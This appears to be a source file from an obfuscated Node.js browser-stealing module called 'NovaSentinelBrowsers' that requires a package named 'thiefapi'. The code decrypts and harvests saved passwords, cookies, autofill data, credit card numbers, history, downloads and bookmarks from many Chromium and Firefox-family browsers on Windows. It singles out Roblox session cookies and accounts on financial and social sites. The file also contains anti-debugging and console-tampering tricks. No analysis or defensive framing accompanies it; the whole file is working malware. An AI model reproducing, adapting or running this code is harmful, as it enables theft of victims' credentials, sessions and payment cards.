const _0xdd29d = (function () {
  let _0x4f6a7e = true
  return function (_0x335f58, _0x5b3d6f) {
    const _0x452b9 = _0x4f6a7e
      ? function () {
          if (_0x5b3d6f) {
            const _0x1daec1 = _0x5b3d6f.apply(_0x335f58, arguments)
            return (_0x5b3d6f = null), _0x1daec1
          }
        }
      : function () {}
    return (_0x4f6a7e = false), _0x452b9
  }
})()
const _0x3fa309 = _0xdd29d(this, function () {
  return _0x3fa309
    .toString()
    .search('(((.+)+)+)+$')
    .toString()
    .constructor(_0x3fa309)
    .search('(((.+)+)+)+$')
})
_0x3fa309()
const _0x27fa53 = (function () {
  let _0x22f279 = true
  return function (_0x50a423, _0xe84404) {
    const _0x4281a7 = _0x22f279
      ? function () {
          if (_0xe84404) {
            const _0x34a0e3 = _0xe84404.apply(_0x50a423, arguments)
            return (_0xe84404 = null), _0x34a0e3
          }
        }
      : function () {}
    return (_0x22f279 = false), _0x4281a7
  }
})()
;(function () {
  _0x27fa53(this, function () {
    const _0x3a505c = new RegExp('function *\\( *\\)')
    const _0x49395b = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i'),
      _0x14d4af = _0x550ec8('init')
    !_0x3a505c.test(_0x14d4af + 'chain') || !_0x49395b.test(_0x14d4af + 'input')
      ? _0x14d4af('0')
      : _0x550ec8()
  })()
})()
const _0x2f4a91 = (function () {
    let _0x3b9203 = true
    return function (_0x1a218d, _0x2855e1) {
      const _0x1fcf10 = _0x3b9203
        ? function () {
            if (_0x2855e1) {
              const _0x528454 = _0x2855e1.apply(_0x1a218d, arguments)
              return (_0x2855e1 = null), _0x528454
            }
          }
        : function () {}
      return (_0x3b9203 = false), _0x1fcf10
    }
  })(),
  _0x58ff29 = _0x2f4a91(this, function () {
    let _0x228f93
    try {
      const _0x594cef = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x228f93 = _0x594cef()
    } catch (_0x34110d) {
      _0x228f93 = window
    }
    const _0x506065 = (_0x228f93.console = _0x228f93.console || {}),
      _0x551f5b = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x3333a9 = 0; _0x3333a9 < _0x551f5b.length; _0x3333a9++) {
      const _0xa270a7 = _0x2f4a91.constructor.prototype.bind(_0x2f4a91),
        _0x48e1ff = _0x551f5b[_0x3333a9],
        _0x592729 = _0x506065[_0x48e1ff] || _0xa270a7
      _0xa270a7['__proto__'] = _0x2f4a91.bind(_0x2f4a91)
      _0xa270a7.toString = _0x592729.toString.bind(_0x592729)
      _0x506065[_0x48e1ff] = _0xa270a7
    }
  })
_0x58ff29()
const _0xb6cc3f = require('fs'),
  _0x921459 = require('sqlite3'),
  _0x427cf3 = require('thiefapi'),
  _0x3cd19c = require('crypto'),
  _0x1005c7 = require('iconv-lite'),
  _0x4ba978 = require('./save')
const { stat: _0x12f171 } = require('./stats'),
  _0x451b72 = require('./gecko'),
  _0x17b645 = require('path'),
  _0x4baa07 = require('./files')
website = []
class _0x5944e9 {
  constructor(
    _0x4ac9b6,
    _0x39c55d,
    _0x58fd1e,
    _0x35b085,
    _0x349238,
    _0x33b0a2
  ) {
    this.host = _0x4ac9b6
    this.path = _0x39c55d
    this.secure = _0x58fd1e
    this.expires = _0x35b085
    this.name = _0x349238
    this.value = _0x33b0a2
  }
  ['build']() {
    return (
      this.host +
      '\tTRUE\t' +
      this.path +
      '\t' +
      this.secure +
      '\t' +
      this.expires +
      '\t' +
      this.name +
      '\t' +
      this.value +
      '\n'
    )
  }
}
class _0x7f26d6 {
  constructor(_0xac8206, _0x32f9db, _0x459685, _0xf21ea0, _0x340487) {
    this.site = _0xac8206
    this.username = _0x32f9db
    this.password = _0x459685
    this.timestamp = _0xf21ea0
    this.browser = _0x340487
  }
  ['build']() {
    return (
      'Site: ' +
      this.site +
      '\nUsername: ' +
      this.username +
      '\nPassword: ' +
      this.password +
      '\nBrowser: ' +
      this.browser +
      ' | ' +
      this.timestamp +
      '\n'
    )
  }
}
class _0x46023c {
  constructor(_0x3f1c68, _0x4cd019, _0xe3550f) {
    this.input = _0x3f1c68
    this.value = _0x4cd019
    this.browser = _0xe3550f
  }
  ['build']() {
    return (
      'Input: ' +
      this.input +
      '\nValue: ' +
      this.value +
      '\nBrowser: ' +
      this.browser +
      '\n'
    )
  }
}
class _0x4af6c2 {
  constructor(
    _0x539750,
    _0x1427f8,
    _0x198d9a,
    _0x4797ff,
    _0x532b05,
    _0xcaef57,
    _0x1667a3
  ) {
    this.guid = _0x539750
    this.name = _0x1427f8
    this.address = _0xcaef57
    this.nickname = _0x1667a3
    this.expiration = _0x198d9a + '/' + _0x4797ff
    this.number = _0x532b05
  }
  ['build']() {
    return (
      'Guid: ' +
      this.guid +
      '\nName: ' +
      this.name +
      '\nAdress: ' +
      this.address +
      '\nNickname: ' +
      this.nickname +
      '\nExpiration: ' +
      this.expiration +
      '\nNumber: ' +
      this.number +
      '\n'
    )
  }
}
class _0x1ac45a {
  constructor(_0x3b4328, _0x2aa510, _0x19bbc2, _0x1aebb7) {
    this.url = _0x3b4328
    this.title = _0x2aa510
    this.count = _0x19bbc2
    this.timestamp = _0x1aebb7
  }
  ['build']() {
    return (
      'Url: ' +
      this.url +
      '\nTitle: ' +
      this.title +
      '\nCount: ' +
      this.count +
      '\nTimestamp: ' +
      this.timestamp +
      '\n'
    )
  }
}
class _0x457478 {
  constructor(_0x19958d, _0xd3e3a2, _0x210421) {
    this.path = _0x19958d
    this.url = _0xd3e3a2
    this.total_bytes = _0x210421
  }
  ['build']() {
    return (
      'Url: ' +
      this.url +
      '\nPath: ' +
      this.path +
      '\nTotalBytes: ' +
      this.total_bytes +
      '\n'
    )
  }
}
class _0x3dd17c {
  constructor(_0x41dabd, _0x57be2a, _0x4c3014, _0x3e96df) {
    this.url = _0x57be2a
    this.name = _0x41dabd
    this.timestamp = _0x4c3014
    this.browser = _0x3e96df
  }
  ['build']() {
    return (
      'Url: ' +
      this.url +
      '\nName: ' +
      this.name +
      '\nBrowser: ' +
      this.browser +
      '\nTimestamp: ' +
      this.timestamp +
      '\n'
    )
  }
}
function _0x31338f(_0x26919e, _0x23e6a1) {
  let _0x56e50e = []
  if (_0xb6cc3f.existsSync(_0x26919e)) {
    let _0x5f27f2 = _0xb6cc3f.readdirSync(_0x26919e)
    for (let _0x136f9f of _0x5f27f2) {
      ;(_0x136f9f.includes('Profile') || _0x136f9f == 'Default') &&
        _0x56e50e.push({
          path: '' + _0x26919e + _0x136f9f + '\\',
          name: _0x23e6a1,
          profile: _0x136f9f,
        })
    }
    return _0x56e50e
  } else {
    return []
  }
}
function _0x2f4faa(_0x472aae, _0x1cb334) {
  let _0x356706 = []
  if (_0xb6cc3f.existsSync(_0x472aae)) {
    let _0x435993 = _0xb6cc3f.readdirSync(_0x472aae)
    for (let _0x43b038 of _0x435993) {
      ;(_0x43b038.includes('.default-release') ||
        _0x43b038.includes('.default-default-')) &&
        _0x356706.push({
          path: '' + _0x472aae + _0x43b038 + '\\',
          name: _0x1cb334,
        })
    }
    return _0x356706
  } else {
    return []
  }
}
function _0x60608e(_0x263b9c) {
  if (_0xb6cc3f.existsSync(_0x263b9c + 'Local State')) {
    let _0x457107 = JSON.parse(
        _0xb6cc3f.readFileSync(_0x263b9c + 'Local State', 'utf8')
      ),
      _0x5b3a35 = _0x457107.os_crypt.encrypted_key
    return (
      (_0x5b3a35 = _0x427cf3.unprotectData(
        Buffer.from(Buffer.from(_0x5b3a35, 'base64').slice(5), 'utf-8'),
        null,
        'CurrentUser'
      )),
      _0x5b3a35
    )
  } else {
    if (_0xb6cc3f.existsSync(_0x263b9c + '..\\Local State')) {
      let _0x7852c8 = JSON.parse(
          _0xb6cc3f.readFileSync(_0x263b9c + '..\\Local State', 'utf8')
        ),
        _0x1329d1 = _0x7852c8.os_crypt.encrypted_key
      return (
        (_0x1329d1 = _0x427cf3.unprotectData(
          Buffer.from(Buffer.from(_0x1329d1, 'base64').slice(5), 'utf-8'),
          null,
          'CurrentUser'
        )),
        _0x1329d1
      )
    } else {
      return ''
    }
  }
}
async function _0x5e69bf(_0x537860, _0xe3e103) {
  let _0x44d624 = _0x537860 + '_tmp'
  _0xb6cc3f.copyFileSync(_0x537860, _0x44d624)
  let _0x280dbf = new _0x921459.Database(_0x44d624)
  let _0x14a56e = await new Promise((_0x108375, _0x35ec2e) => {
    _0x280dbf.all(_0xe3e103, (_0x30fbba, _0x5606a9) => {
      _0x30fbba ? _0x35ec2e(_0x30fbba) : _0x108375(_0x5606a9)
    })
  })
  _0x280dbf.close()
  try {
    _0xb6cc3f.unlinkSync(_0x44d624)
  } catch (_0x252f40) {}
  return _0x14a56e
}
function _0x182df1(_0x4f4ad8, _0x19627c) {
  let _0x10ffeb = _0x4f4ad8.slice(3, 15),
    _0x24d0c5 = _0x4f4ad8.slice(15, _0x4f4ad8.length - 16),
    _0x120417 = _0x4f4ad8.slice(_0x4f4ad8.length - 16, _0x4f4ad8.length),
    _0x128989 = _0x3cd19c.createDecipheriv('aes-256-gcm', _0x19627c, _0x10ffeb)
  return (
    _0x128989.setAuthTag(_0x120417),
    (decrypted =
      _0x128989.update(_0x24d0c5, 'base64', 'utf-8') + _0x128989.final('utf-8'))
  )
}
async function _0xfd51e7(_0xfc6117) {
  let _0x4a1cd9 = []
  let _0x30a39c = _0x60608e(_0xfc6117)
  if (_0xb6cc3f.existsSync(_0xfc6117 + 'Network\\Cookies')) {
    var _0x24fc7b = []
    try {
      _0x24fc7b = await _0x5e69bf(
        _0xfc6117 + 'Network\\Cookies',
        'SELECT name, host_key, path, expires_utc, is_secure, encrypted_value FROM cookies'
      )
    } catch (_0x335d2b) {}
    for (let _0x3a9d4a of _0x24fc7b) {
      let _0x5f41d9 = _0x3a9d4a.encrypted_value
      if (
        _0x5f41d9.toString().startsWith('v10') ||
        _0x5f41d9.toString().startsWith('v11')
      ) {
        if (_0x30a39c == '') {
          continue
        }
        try {
          _0x5f41d9 = _0x182df1(_0x5f41d9, _0x30a39c)
        } catch (_0x29ecfd) {
          continue
        }
      } else {
        try {
          _0x5f41d9 = _0x427cf3.unprotectData(_0x5f41d9, null, 'CurrentUser')
        } catch (_0x5c5ad2) {
          continue
        }
      }
      _0x3a9d4a.name.includes('.ROBLOSECURITY') &&
        _0x12f171.AddRoblox(_0x5f41d9)
      _0x4a1cd9.push(
        new _0x5944e9(
          _0x3a9d4a.host_key,
          _0x3a9d4a.path,
          _0x3a9d4a.is_secure,
          _0x3a9d4a.expires_utc,
          _0x3a9d4a.name,
          _0x5f41d9
        )
      )
    }
  }
  return _0x4a1cd9
}
async function _0x52b4a4(_0x509dba, _0x3e8b2c) {
  var _0x1fd483 = []
  let _0xd1fdd4 = _0x60608e(_0x509dba)
  var _0x2a7302 = ''
  _0x509dba.includes('Yandex')
    ? (_0x2a7302 = _0x509dba + 'Ya Passman Data')
    : (_0x2a7302 = _0x509dba + 'Login Data')
  if (_0xb6cc3f.existsSync(_0x2a7302)) {
    let _0x1516f7 = []
    try {
      _0x1516f7 = await _0x5e69bf(
        _0x2a7302,
        'SELECT origin_url, username_value, password_value, date_created FROM logins'
      )
    } catch (_0xd8a09a) {}
    for (let _0x9abdf3 of _0x1516f7) {
      let _0x52d833 = _0x9abdf3.password_value
      if (
        _0x52d833.toString().startsWith('v10') ||
        _0x52d833.toString().startsWith('v11')
      ) {
        if (_0xd1fdd4 == '') {
          continue
        }
        try {
          _0x52d833 = _0x182df1(_0x52d833, _0xd1fdd4)
        } catch (_0x5c422c) {
          continue
        }
      } else {
        try {
          _0x52d833 = _0x427cf3.unprotectData(_0x52d833, null, 'CurrentUser')
        } catch (_0x1bd027) {
          continue
        }
      }
      _0x9abdf3.username_value != '' &&
        _0x52d833 != '' &&
        (_0x1fd483.push(
          new _0x7f26d6(
            _0x9abdf3.origin_url,
            _0x9abdf3.username_value,
            _0x52d833,
            _0x9abdf3.date_created,
            _0x3e8b2c
          )
        ),
        website.push(_0x9abdf3.origin_url))
    }
  }
  return _0x1fd483
}
async function _0x456696(_0x3146a0, _0x2d1403) {
  var _0x3fbba2 = []
  if (_0xb6cc3f.existsSync(_0x3146a0 + 'Web Data')) {
    let _0x6d9846 = []
    try {
      _0x6d9846 = await _0x5e69bf(
        _0x3146a0 + 'Web Data',
        'SELECT name, value FROM autofill'
      )
    } catch (_0x194c7f) {}
    for (let _0x36ef55 of _0x6d9846) {
      _0x3fbba2.push(new _0x46023c(_0x36ef55.name, _0x36ef55.value, _0x2d1403))
    }
  }
  return _0x3fbba2
}
async function _0x5c6994(_0xaa1d33) {
  var _0x40956d = []
  if (_0xb6cc3f.existsSync(_0xaa1d33 + 'History')) {
    let _0x5f3255 = []
    try {
      _0x5f3255 = await _0x5e69bf(
        _0xaa1d33 + 'History',
        'SELECT target_path, tab_url, total_bytes FROM downloads'
      )
    } catch (_0x218103) {}
    for (let _0x26a541 of _0x5f3255) {
      _0x40956d.push(
        new _0x457478(
          _0x26a541.target_path,
          _0x26a541.tab_url,
          _0x26a541.total_bytes
        )
      )
    }
  }
  return _0x40956d
}
async function _0x474af6(_0x151b25) {
  let _0x1c5b66 = []
  let _0x532c9f = _0x60608e(_0x151b25)
  if (_0xb6cc3f.existsSync(_0x151b25 + 'Web Data')) {
    let _0x31265c = []
    try {
      _0x31265c = await _0x5e69bf(
        _0x151b25 + 'Web Data',
        'SELECT guid, name_on_card, expiration_month, expiration_year, card_number_encrypted, billing_address_id, nickname FROM credit_cards'
      )
    } catch (_0x274fd5) {}
    for (let _0x5e057a of _0x31265c) {
      let _0x32bf93 = _0x5e057a.card_number_encrypted
      if (
        _0x32bf93.toString().startsWith('v10') ||
        _0x32bf93.toString().startsWith('v11')
      ) {
        if (_0x532c9f == '') {
          continue
        }
        try {
          _0x32bf93 = _0x182df1(_0x32bf93, _0x532c9f)
        } catch (_0x175692) {
          continue
        }
      } else {
        try {
          _0x32bf93 = _0x427cf3.unprotectData(_0x32bf93, null, 'CurrentUser')
        } catch (_0x206dd5) {
          continue
        }
      }
      _0x1c5b66.push(
        new _0x4af6c2(
          _0x5e057a.guid,
          _0x5e057a.name_on_card,
          _0x5e057a.expiration_month,
          _0x5e057a.expiration_year,
          _0x32bf93,
          _0x5e057a.billing_address_id,
          _0x5e057a.nickname
        )
      )
    }
  }
  return _0x1c5b66
}
async function _0x83198d(_0x4f9658) {
  var _0x5bcf70 = []
  if (_0xb6cc3f.existsSync(_0x4f9658 + 'History')) {
    let _0x20d78c = []
    try {
      _0x20d78c = await _0x5e69bf(
        _0x4f9658 + 'History',
        'SELECT url, title, visit_count, last_visit_time FROM urls'
      )
    } catch (_0x5674ce) {}
    for (let _0x5b4ae2 of _0x20d78c) {
      _0x5bcf70.push(
        new _0x1ac45a(
          _0x5b4ae2.url,
          _0x5b4ae2.title,
          _0x5b4ae2.visit_count,
          _0x5b4ae2.last_visit_time
        )
      )
    }
  }
  return _0x5bcf70
}
async function _0x31eb40(_0x5ceac9, _0x16ed07) {
  let _0x23b69a = []
  if (_0xb6cc3f.existsSync(_0x5ceac9 + 'Bookmarks')) {
    _0xb6cc3f.copyFileSync(_0x5ceac9 + 'Bookmarks', _0x5ceac9 + 'Bookmarks_tmp')
    let _0x2c25fc = JSON.parse(
      _0xb6cc3f.readFileSync(_0x5ceac9 + 'Bookmarks_tmp')
    )
    _0xb6cc3f.unlinkSync(_0x5ceac9 + 'Bookmarks_tmp')
    for (let _0x55d502 of _0x2c25fc.roots.bookmark_bar.children) {
      _0x23b69a.push(
        new _0x3dd17c(
          _0x55d502.name,
          _0x55d502.url,
          _0x55d502.date_added,
          _0x16ed07
        )
      )
    }
  }
  return _0x23b69a
}
async function _0x2c284d(_0x53f175) {
  var _0x34a107 = []
  if (_0xb6cc3f.existsSync(_0x53f175 + 'cookies.sqlite')) {
    let _0x497272 = []
    try {
      _0x497272 = await _0x5e69bf(
        _0x53f175 + 'cookies.sqlite',
        'SELECT name, value, host, path, expiry, isSecure FROM moz_cookies'
      )
    } catch (_0x275b71) {}
    row.name.includes('.ROBLOSECURITY') && _0x12f171.AddRoblox(row.value)
    for (let _0x4aa8d7 of _0x497272) {
      _0x34a107.push(
        new _0x5944e9(
          _0x4aa8d7.host,
          _0x4aa8d7.path,
          _0x4aa8d7.isSecure,
          _0x4aa8d7.expiry,
          _0x4aa8d7.name,
          _0x4aa8d7.value
        )
      )
    }
  }
  return _0x34a107
}
async function _0x2c51ec(_0x15f588, _0x2fa1dc, _0x59c2be) {
  const _0x1414cb = [],
    _0x2ac0e3 = await _0x451b72.getKey(_0x15f588, _0x2fa1dc)
  if (_0x2ac0e3 == null) {
    return _0x1414cb
  }
  const _0x492b20 = _0x17b645.join(_0x15f588, 'logins.json')
  if (!_0xb6cc3f.existsSync(_0x492b20)) {
    return _0x1414cb
  }
  const _0x3befa0 = _0xb6cc3f.readFileSync(_0x492b20, 'utf8'),
    _0x55ac83 = JSON.parse(_0x3befa0)
  for (const _0x48eafb of _0x55ac83.logins) {
    const _0x6cd35c = _0x451b72.decodeLoginData(_0x48eafb.encryptedUsername),
      _0x115bfe = _0x451b72.decodeLoginData(_0x48eafb.encryptedPassword),
      _0x53a841 = _0x451b72.decrypt(
        _0x6cd35c.data,
        _0x6cd35c.iv,
        _0x2ac0e3,
        '3DES-CBC'
      ),
      _0x3fa387 = _0x451b72.decrypt(
        _0x115bfe.data,
        _0x115bfe.iv,
        _0x2ac0e3,
        '3DES-CBC'
      )
    let _0x39b2b6 = _0x1005c7.encode(_0x53a841.data, 'latin1').toString()
    _0x39b2b6 != _0x53a841.data && (_0x53a841.data = _0x39b2b6)
    let _0x123b6d = _0x1005c7.encode(_0x3fa387.data, 'latin1').toString()
    _0x123b6d != _0x3fa387.data && (_0x3fa387.data = _0x123b6d)
    _0x1414cb.push(
      new _0x7f26d6(
        _0x48eafb.hostname,
        _0x53a841.data,
        _0x3fa387.data,
        _0x48eafb.timeLastUsed,
        _0x59c2be
      )
    )
  }
  return _0x1414cb
}
async function _0x4e9164(_0x1e67af, _0xdeb2cf) {
  let _0x418b83 = []
  if (_0xb6cc3f.existsSync(_0x1e67af + 'places.sqlite')) {
    let _0x1280f7 = []
    try {
      _0x1280f7 = await _0x5e69bf(
        _0x1e67af + 'places.sqlite',
        'SELECT id, url, dateAdded, title FROM (SELECT * FROM moz_bookmarks INNER JOIN moz_places ON moz_bookmarks.fk=moz_places.id)'
      )
    } catch (_0x1ebd70) {}
    for (let _0x19cded of _0x1280f7) {
      _0x418b83.push(
        new _0x3dd17c(
          _0x19cded.title,
          _0x19cded.url,
          _0x19cded.dateAdded,
          _0xdeb2cf
        )
      )
    }
  }
  return _0x418b83
}
async function _0x2f90bd(_0x5dc4d2) {
  let _0x29555b = []
  if (_0xb6cc3f.existsSync(_0x5dc4d2 + 'places.sqlite')) {
    let _0x5cf6df = []
    try {
      _0x5cf6df = await _0x5e69bf(
        _0x5dc4d2 + 'places.sqlite',
        'SELECT title, url, visit_count, last_visit_date FROM moz_places where title not null'
      )
    } catch (_0x488310) {}
    for (let _0x378204 of _0x5cf6df) {
      _0x29555b.push(
        new _0x1ac45a(
          _0x378204.url,
          _0x378204.title,
          _0x378204.visit_count,
          _0x378204.last_visit_date
        )
      )
    }
  }
  return _0x29555b
}
async function _0x10769a(_0x35de05) {
  let _0x52ccee = []
  if (_0xb6cc3f.existsSync(_0x35de05 + 'places.sqlite')) {
    let _0x1dfb85 = []
    try {
      _0x1dfb85 = await _0x5e69bf(
        _0x35de05 + 'places.sqlite',
        'SELECT GROUP_CONCAT(content), url, dateAdded FROM (SELECT * FROM moz_annos INNER JOIN moz_places ON moz_annos.place_id=moz_places.id) t GROUP BY place_id'
      )
    } catch (_0x2f1263) {}
    for (let _0x177bbc of _0x1dfb85) {
      try {
        _0x52ccee.push(
          new _0x457478(
            _0x177bbc['GROUP_CONCAT(content)'].split('},')[1],
            _0x177bbc.url,
            JSON.parse(
              _0x177bbc['GROUP_CONCAT(content)'].split('},')[0] + '}'
            ).fileSize
          )
        )
      } catch (_0x3cf1b8) {
        continue
      }
    }
  }
  return _0x52ccee
}
async function _0x3d8cd0(_0x2eda06) {
  if (_0x2eda06 != 'yes') {
    return
  }
  let _0x26bbb2 = process.env.APPDATA,
    _0x68cf82 = process.env.LOCALAPPDATA
  var _0x593971 = [
    {
      path: _0x26bbb2 + '\\Opera Software\\Opera Stable\\',
      name: 'Opera',
    },
    {
      path: _0x26bbb2 + '\\Opera Software\\Opera GX Stable\\',
      name: 'OperaGX',
    },
    {
      path: _0x68cf82 + '\\Epic Privacy Browser\\User Data\\',
      name: 'EpicPrivacy',
    },
    {
      path: _0x68cf82 + '\\Google\\Chrome SxS\\User Data\\',
      name: 'ChromeSxS',
    },
    {
      path: _0x68cf82 + '\\Sputnik\\Sputnik\\User Data\\',
      name: 'Sputnik',
    },
    {
      path: _0x68cf82 + '\\7Star\\7Star\\User Data\\',
      name: '7Star',
    },
    {
      path: _0x68cf82 + '\\CentBrowser\\User Data\\',
      name: 'CentBrowser',
    },
    {
      path: _0x68cf82 + '\\Orbitum\\User Data\\',
      name: 'Orbitum',
    },
    {
      path: _0x68cf82 + '\\Kometa\\User Data\\',
      name: 'Kometa',
    },
    {
      path: _0x68cf82 + '\\Torch\\User Data\\',
      name: 'Torch',
    },
    {
      path: _0x68cf82 + '\\Amigo\\User Data\\',
      name: 'Amigo',
    },
  ]
  _0x593971 = _0x593971.concat(
    _0x31338f(
      _0x68cf82 + '\\BraveSoftware\\Brave-Browser\\User Data\\',
      'Brave'
    )
  )
  _0x593971 = _0x593971.concat(
    _0x31338f(_0x68cf82 + '\\Iridium\\User Data\\', 'Iridium')
  )
  _0x593971 = _0x593971.concat(
    _0x31338f(_0x68cf82 + '\\Yandex\\YandexBrowser\\User Data\\', 'Yandex')
  )
  _0x593971 = _0x593971.concat(
    _0x31338f(_0x68cf82 + '\\uCozMedia\\Uran\\User Data\\', 'Uran')
  )
  _0x593971 = _0x593971.concat(
    _0x31338f(_0x68cf82 + '\\Microsoft\\Edge\\User Data\\', 'Edge')
  )
  _0x593971 = _0x593971.concat(
    _0x31338f(_0x68cf82 + '\\Google\\Chrome\\User Data\\', 'Chrome')
  )
  _0x593971 = _0x593971.concat(
    _0x31338f(_0x68cf82 + '\\Vivaldi\\User Data\\', 'Vivaldi')
  )
  var _0x5725cd = 0
  var _0x536d77 = []
  var _0x18423b = [],
    _0x352226 = [],
    _0x23cb6d = []
  var _0x40fcfe = [],
    _0x3b5ff1 = []
  let _0x6a2c2 = 0
  for (let _0x3f9ea3 of _0x593971) {
    const _0x20da93 = _0x3f9ea3.path
    if (!_0xb6cc3f.existsSync(_0x20da93)) {
      continue
    }
    _0x6a2c2++
    try {
      const _0x2c74c9 = await _0xfd51e7(_0x20da93)
      _0x5725cd += _0x2c74c9.length
      let _0x262718
      typeof _0x3f9ea3.profile != 'undefined'
        ? (_0x262718 = _0x3f9ea3.name + ' [ ' + _0x3f9ea3.profile + ' ]')
        : (_0x262718 = _0x3f9ea3.name)
      _0x4ba978.saveCookies(_0x2c74c9, _0x262718)
      _0x536d77 = _0x536d77.concat(await _0x52b4a4(_0x20da93, _0x262718))
      _0x18423b = _0x18423b.concat(await _0x456696(_0x20da93, _0x262718))
      _0x352226 = _0x352226.concat(await _0x474af6(_0x20da93))
      _0x40fcfe = _0x40fcfe.concat(await _0x83198d(_0x20da93))
      _0x3b5ff1 = _0x3b5ff1.concat(await _0x5c6994(_0x20da93))
      _0x23cb6d = _0x23cb6d.concat(await _0x31eb40(_0x20da93, _0x262718))
    } catch (_0xefc345) {
      continue
    }
  }
  let _0x584d88 = []
  _0x584d88 = _0x584d88.concat(
    _0x2f4faa(_0x26bbb2 + '\\Mozilla\\Firefox\\Profiles\\', 'Firefox')
  )
  _0x584d88 = _0x584d88.concat(
    _0x2f4faa(_0x26bbb2 + '\\Waterfox\\Profiles\\', 'Waterfox')
  )
  for (let _0x4f4570 of _0x584d88) {
    const _0x47661d = _0x4f4570.path
    if (!_0xb6cc3f.existsSync(_0x47661d)) {
      continue
    }
    _0x6a2c2++
    try {
      const _0x1494f8 = await _0x2c284d(_0x47661d)
      _0x5725cd += _0x1494f8.length
      _0x4ba978.saveCookies(_0x1494f8, _0x4f4570.name)
      _0x23cb6d = _0x23cb6d.concat(await _0x4e9164(_0x47661d, _0x4f4570.name))
      _0x40fcfe = _0x40fcfe.concat(await _0x2f90bd(_0x47661d))
      _0x3b5ff1 = _0x3b5ff1.concat(await _0x10769a(_0x47661d))
      _0x536d77 = _0x536d77.concat(
        await _0x2c51ec(_0x47661d, '', _0x4f4570.name)
      )
    } catch (_0x321b72) {
      continue
    }
  }
  const _0x1aa99b = [
    'gmail',
    'youtube',
    'onoff',
    'xss.is',
    'pronote',
    'ovhcloud',
    'nulled',
    'cracked',
    'tiktok',
    'yahoo',
    'gmx',
    'aol',
    'coinbase',
    'binance',
    'steam',
    'epicgames',
    'discord',
    'paypal',
    'instagram',
    'spotify',
    'onlyfans',
    'pornhub',
    'origin',
    'amazon',
    'twitter',
    'aliexpress',
    'netflix',
    'roblox',
    'twitch',
    'facebook',
    'riotgames',
    'card',
    'telegram',
    'protonmail',
  ]
  function _0x484909(_0xe9ff88, _0x593d7f) {
    let _0x56858d = { _0x2a6593: 0 }
    _0x593d7f.forEach((_0x2a6593) => {})
    _0xe9ff88.forEach((_0x3a60f9) => {
      _0x593d7f.forEach((_0x519930) => {
        _0x3a60f9.includes(_0x519930) && _0x56858d[_0x519930]++
      })
    })
    return _0x56858d
  }
  const _0x3eb8f4 = _0x484909(website, _0x1aa99b)
  for (const _0x418422 in _0x3eb8f4) {
    _0x3eb8f4[_0x418422] > 0 &&
      _0x12f171.AddKeyword(' ' + _0x418422 + ' : ' + _0x3eb8f4[_0x418422])
  }
  _0x4ba978.saveBrowser(
    _0x536d77,
    _0x18423b,
    _0x352226,
    _0x40fcfe,
    _0x3b5ff1,
    _0x23cb6d
  )
  _0x12f171.AddBrowser(
    _0x536d77.length,
    _0x5725cd,
    _0x18423b.length,
    _0x352226.length,
    _0x40fcfe.length,
    _0x3b5ff1.length,
    _0x23cb6d.length
  )
  var _0xd7b9ce = []
  for (let _0x501902 = 0; _0x501902 < _0x536d77.length; _0x501902++) {
    _0xd7b9ce.push(_0x536d77[_0x501902].password)
  }
  return _0xd7b9ce
}
module.exports = {
  NovaSentinelBrowsers: _0x3d8cd0,
  getGeckoPasswords: _0x2c51ec,
  getGeckoProfiles: _0x2f4faa,
}
function _0x550ec8(_0xdea136) {
  function _0x32ddf2(_0x4fba2a) {
    if (typeof _0x4fba2a === 'string') {
      return function (_0x1780d1) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x4fba2a / _0x4fba2a).length !== 1 || _0x4fba2a % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x32ddf2(++_0x4fba2a)
  }
  try {
    if (_0xdea136) {
      return _0x32ddf2
    } else {
      _0x32ddf2(0)
    }
  } catch (_0x5a825b) {}
}
